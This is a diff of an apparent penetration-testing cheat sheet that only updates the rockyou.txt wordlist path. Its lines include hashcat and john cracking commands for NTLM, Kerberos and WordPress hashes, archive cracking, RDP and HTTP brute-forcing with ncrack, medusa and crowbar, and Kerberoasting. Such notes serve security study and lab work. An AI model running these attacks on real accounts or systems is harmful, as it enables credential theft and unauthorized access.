@@ -1357,9 +1357,9 @@ cewl
 hash-identifier
 pdfcrack SomeFile.pdf -w ~kali/rockyou.txt (For PDF files with passwords)
 fcrackzip -u -D -p ~kali/rockyou.txt SomeZip.backup (Cracking zip files passwords)
-rar2john MSSQL_BAK.rar --> john -wordlist=/home/kali/rockyou.txt MSQL.hashes (Cracking rar files)
+rar2john MSSQL_BAK.rar --> john -wordlist=/home/kali/Documents/crack/rockyou.txt  MSQL.hashes (Cracking rar files)
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
-john --wordlist=/home/kali/rockyou.txt sammy_hash.txt # Crack user hash [user:hash] in file
+john --wordlist=/home/kali/Documents/crack/rockyou.txt  sammy_hash.txt # Crack user hash [user:hash] in file
 medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
 ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
 crowbar -b rdp -s 10.11.1.111/32 -u victim -C /root/words.txt -n 1
@@ -1392,13 +1392,13 @@ Hashcat
 https://hashcat.net/wiki/doku.php?id=example_hashes // m parameter
 https://mattw.io/hashID/types // hashid match
 
-hashcat -m 0 'hash$' /home/kali/rockyou.txt // MD5 raw
-hashcat -m 1800 'hash$' /home/kali/rockyou.txt // sha512crypt
-hashcat -m 1600 'hash$' /home/kali/rockyou.txt // MD5(APR)
-hashcat -m 1500 'hash$' /home/kali/rockyou.txt // DES(Unix), Traditional DES, DEScrypt
-hascat  -m 1000 'hash$' /home/kali/rockyou.txt // NTLM
-hashcat -m 500 'hash$' /home/kali/rockyou.txt // MD5crypt, MD5 (Unix)
-hashcat -m 400 'hash$'/home/kali/rockyou.txt // Wordpress
+hashcat -m 0 'hash$' /home/kali/Documents/crack/rockyou.txt  // MD5 raw
+hashcat -m 1800 'hash$' /home/kali/Documents/crack/rockyou.txt  // sha512crypt
+hashcat -m 1600 'hash$' /home/kali/Documents/crack/rockyou.txt  // MD5(APR)
+hashcat -m 1500 'hash$' /home/kali/Documents/crack/rockyou.txt  // DES(Unix), Traditional DES, DEScrypt
+hascat  -m 1000 'hash$' /home/kali/Documents/crack/rockyou.txt  // NTLM
+hashcat -m 500 'hash$' /home/kali/Documents/crack/rockyou.txt  // MD5crypt, MD5 (Unix)
+hashcat -m 400 'hash$'/home/kali/Documents/crack/rockyou.txt  // Wordpress
 
 ```
 Online crackers
@@ -2123,7 +2123,7 @@ c:\WINDOWS\SchedLgU.Txt
 Remote desktop
 
 ```
-ncrack -vv --user george -P /home/kali/rockyou.txt rdp://10.11.1.111
+ncrack -vv --user george -P /home/kali/Documents/crack/rockyou.txt  rdp://10.11.1.111
 ```
 
 ### Add user and enable RDP
@@ -2535,13 +2535,13 @@ Next type: PS C:\Users\Public> Invoke-Kerberoast.ps1
 
 Invoke-Kerberoast -OutputFormat Hashcat | % {$_.Hash} | Out-File -Encoding ascii hashes.hashcat
 
-hashcat -m 13100 -a 0 -o cracked.txt hashes.hashcat /home/kali/rockyou.txt  ##Use SMBserver to transfer hashes
+hashcat -m 13100 -a 0 -o cracked.txt hashes.hashcat /home/kali/Documents/crack/rockyou.txt   ##Use SMBserver to transfer hashes
 
 # Grabbing tickets for john:
 
 PS C:\Tools\active_directory> Invoke-Kerberoast -OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')}
 
-sudo john --format=krb5tgs hash.txt --wordlist=/home/kali/rockyou.txt  #Use SMBserver to transfer hashes 
+sudo john --format=krb5tgs hash.txt --wordlist=/home/kali/Documents/crack/rockyou.txt   #Use SMBserver to transfer hashes 
 
 ```
 
